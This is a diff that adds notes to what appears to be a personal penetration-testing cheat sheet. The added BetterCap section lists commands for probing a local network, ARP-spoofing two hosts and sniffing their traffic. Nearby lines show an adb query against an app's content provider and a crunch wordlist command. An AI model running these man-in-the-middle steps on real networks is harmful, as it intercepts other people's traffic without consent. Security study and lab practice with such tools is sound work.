@@ -449,6 +449,26 @@ content query --uri content://com.android.asdasd.TrackUserContentProvider/tracku
 
 crunch 8 9 xy123 -o testwordlists
 
+## BetterCap ##
+
+bettercap -iface wlan0
+
+net.probe on
+
+net.show
+
+set arp.spoof.fullduplex true
+
+set arp.spoof.targets 192.168.1.22, 192.168.1.24
+
+arp.spoof on
+
+net.sniff on
+
+## Port Kullanımı ##
+
+lsof -i 80
+
 
 
  
